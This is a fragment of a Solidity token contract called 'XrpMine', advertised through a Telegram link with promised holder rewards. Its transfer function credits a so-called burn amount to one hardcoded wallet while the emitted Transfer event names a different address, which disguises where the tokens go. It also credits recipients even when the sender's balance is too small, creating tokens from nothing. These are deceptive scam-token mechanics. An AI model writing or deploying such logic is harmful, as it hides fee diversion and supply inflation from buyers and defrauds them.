...
// Submitted for Telegram: https://t.me/xrpmineofficial

// Buy Hold XrpMine = Auto Rewards to holders 10% in XRP
...
contract  XrpMine  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xcc97fEf6DF60c2C696eE7AbF2C71610732817Cf9] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE, _bruntoken);
        }
